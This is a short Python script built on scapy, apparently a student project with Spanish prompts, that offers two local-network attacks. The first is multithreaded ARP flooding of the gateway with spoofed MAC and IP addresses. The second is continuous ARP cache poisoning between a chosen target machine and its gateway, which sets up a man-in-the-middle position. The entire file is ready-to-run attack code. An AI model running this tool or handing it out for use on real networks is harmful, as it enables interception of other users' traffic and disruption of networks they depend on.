import threading
import random
import time

from scapy.all import RandIP, sendp, conf, RandMAC, srp, send
from scapy.layers.l2 import Ether, ARP

def bye(q,gateway):
    while(1):
        packets = []
        for i in range(q):
            macVendor = maclist[random.randrange(0, 23054, 1)]

            print(macVendor)

            localmac=macVendor[:2] + ":" +macVendor[2:4] +":"+ macVendor[4:6]+RandMAC().__str__()[8:]
            packet=Ether(src = localmac,dst="ff:ff:ff:ff:ff:ff")/ARP(psrc=RandIP(),pdst=gateway,hwsrc=localmac,hwdst="ff:ff:ff:ff:ff:ff")
            packets.append(packet)


        sendp(packets)
        time.sleep(5)

def spoofing(ipObj,ipPuerta):

    arp = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ipObj)
    macObj = srp(arp, timeout=5 , verbose= False)[0][0][1].hwsrc

    arp = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ipPuerta)
    macPuerta = srp(arp, timeout=5 , verbose= False)[0][0][1].hwsrc

    arpObj = ARP(op=2 , pdst=ipObj, psrc=ipPuerta, hwdst= macObj)
    arpPuerta = ARP(op=2 , pdst=ipPuerta, psrc=ipObj, hwdst= macPuerta)

    while (1):
        send(arpObj, verbose= False)
        send(arpPuerta, verbose= False)

print("powered by Diego Arroyo, Leo Alias Davincho y Juan Castañeda")
if("1"==input("1. ARP flooding \n2. ARP/IP spoofing\n")):
    h = input('Cuantos hilos desea crear?:')
    q = input('Cuantos mensajes desea enviar por hilo?:')

    f = open("mac-vendor.txt", encoding="utf-8")
    maclist = f.read().splitlines()
    f.close()

    gateway = conf.route.route("0.0.0.0")[2]

    for i in range(int(h)):
        t = threading.Thread(target=bye, args=(int(q),gateway))
        t.start()
else:
    ipObj = input('Ip de la maquina objetivo:')
    ipPuerta = input('Ip de la puerta de enlace:')

    spoofing(ipObj,ipPuerta)

